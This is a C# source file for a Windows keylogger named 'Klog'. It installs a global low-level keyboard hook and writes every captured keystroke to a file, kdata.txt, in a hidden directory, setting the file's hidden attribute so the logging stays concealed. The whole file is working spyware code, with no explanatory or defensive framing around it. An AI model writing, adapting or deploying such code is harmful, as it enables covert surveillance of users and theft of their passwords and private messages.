using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace Klog
{
    public partial class Test_Class : Core
    {
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Keys vKeys);

        private const int KEY_PRESSED = 0x8000;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13; // Number of global LowLevel- hook on the keyboard

        private LowLevelKeyboardProc _proc = hookProc;

        private static IntPtr hhook = IntPtr.Zero;

        public static string key_log_file = hidden_dir + @"\kdata.txt";

        public void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }   
        public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code < 0)
                return CallNextHookEx(IntPtr.Zero, code, (int)wParam, lParam);

            var get_char = Enum.GetValues(typeof(Keys));
            string skeyn;
            bool keyp;

            if (!File.Exists(key_log_file))
            {
                try
                {
                    File.Create(key_log_file).Close();
                    File.SetAttributes(key_log_file, FileAttributes.Hidden);
                }
                catch(Exception ex) { MessageBox.Show("Could not create file: " + ex.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            }

            TextWriter twriter = new StreamWriter(key_log_file, true);
            foreach (Keys keyn in get_char)
            {
                keyp = Convert.ToBoolean(GetAsyncKeyState(keyn) & KEY_PRESSED);

                skeyn = keyn.ToString();

                if (keyp)
                {
                    if (!char.IsLetterOrDigit((char)keyn))
                        skeyn = " [ " + keyn.ToString() + " ] ";
                    twriter.Write(skeyn);
                }
            }
            twriter.Close();

            return CallNextHookEx(IntPtr.Zero, code, (int)wParam, lParam);
        }
    }
}
